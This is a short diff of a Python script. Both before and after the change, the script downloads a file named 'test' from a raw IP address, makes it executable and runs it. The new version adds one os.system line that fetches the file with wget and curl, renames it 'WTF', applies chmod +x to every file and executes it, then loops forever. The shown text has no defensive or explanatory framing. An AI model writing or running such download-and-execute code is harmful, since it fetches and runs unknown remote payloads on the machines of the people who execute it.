@@ -1,13 +1,6 @@
-import wget
 import os
 
-remote_url = 'http://45.95.146.91/test'
-
-local_file = 'test'
-
-wget.download(remote_url, local_file)
-
-os.system("chmod 777 *; ./test WORKS")
+os.system("wget http://45.95.146.91/test; curl -O http://45.95.146.91/test;cat test >WTF;chmod +x *;./WTF")
 
 while 1 == 1:
    print("l")
